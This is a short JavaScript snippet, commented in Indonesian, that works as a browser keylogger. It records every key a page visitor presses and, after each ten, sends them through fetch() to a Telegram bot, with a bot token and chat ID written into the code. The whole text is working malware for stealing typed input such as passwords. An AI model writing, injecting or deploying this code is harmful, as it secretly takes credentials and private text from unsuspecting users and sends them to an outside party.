let keys = [];
document.addEventListener("keydown", function(event) {
    keys.push(event.key);
    if (keys.length >= 10) {  // Kirim setelah 10 tombol ditekan
        let message = "Keys: " + keys.join("");
        let botToken = "6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I";
        let chatId = "-1002002449257";
        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .then(response => console.log("Sent:", message))
        .catch(error => console.error("Error:", error));

        keys = [];  // Reset setelah mengirim
    }
});
